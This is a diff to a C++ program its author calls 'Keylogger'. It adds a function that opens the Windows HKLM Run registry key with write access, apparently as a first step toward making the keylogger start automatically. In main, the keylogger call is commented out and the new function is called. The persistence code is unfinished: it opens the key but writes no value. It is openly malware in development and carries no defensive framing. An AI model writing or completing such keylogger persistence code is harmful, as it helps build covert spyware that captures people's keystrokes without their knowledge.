@@ -5,7 +5,22 @@
 using namespace std;
 
 
+void SetRegisteryKey()
+{
+	HMODULE hModule = GetModuleHandle(NULL);
+	HKEY key = NULL;
+	char path[MAX_PATH];
 
+	LONG res = RegOpenKeyEx(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_WRITE | KEY_READ, &key);
+	if (res == ERROR_SUCCESS) {
+		cout << "Bon ";
+		
+	}
+	else {
+		cout << "Pas bon ";
+	}
+
+}
 
 void Keylogger(int delai) {
 	while (true) {
@@ -272,6 +287,9 @@ void Keylogger(int delai) {
 
 int main()
 {
+
 	system("title Keylogger");
-	Keylogger(100);
+	// Keylogger()100;
+	SetRegisteryKey();
+	system("pause");
 }
